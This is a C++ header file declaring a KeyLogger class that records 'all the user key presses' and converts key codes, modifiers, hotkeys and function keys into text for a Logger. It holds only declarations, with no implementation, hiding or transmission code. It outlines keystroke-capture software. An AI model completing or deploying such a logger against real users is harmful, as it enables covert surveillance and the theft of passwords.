#pragma once

#include <string>
#include <iostream>
#include <fstream>
#include "Logger.h"
#include <map>

using namespace std;

/*
	Responsible for logging all the user key presses.
*/
class KeyLogger
{
private:
	Logger* logger;

	// Mappings
	static map<int, wstring> SymbolsMapping;
	static map<int, wstring> WhitespacesMapping;
	static map<int, wstring> HotKeysMapping;

	/*
		Return the textual representation of the given key,
		considering other keys like CTRL or SHIFT.
	*/
	wstring GetKeyText(int keyCode);
	
	// Keycode to text conversion
	wstring GetLetterText(int keyCode);
	wstring GetNumberText(int keyCode);
	wstring GetCombinationText(int keyCode);
	wstring GetFKeyText(int keyCode);
	wstring GetWhitespaceText(int keyCode);
	wstring GetNumpadNumberText(int keyCode);

	// Key code queries 
	bool IsLetter(int keyCode);
	bool IsNumber(int keyCode);
	bool IsNumpadNumber(int keyCode);
	bool IsCombination(int keyCode);
	bool IsFKey(int keyCode);
	bool IsWhitespace(int keyCode);
	

	bool IsPressed(int keyCode);
	bool IsKeyDown(int keyCode);
	bool IsToggled(int keyCode);

public:
	KeyLogger(Logger* logger);
	void StartLogging();
};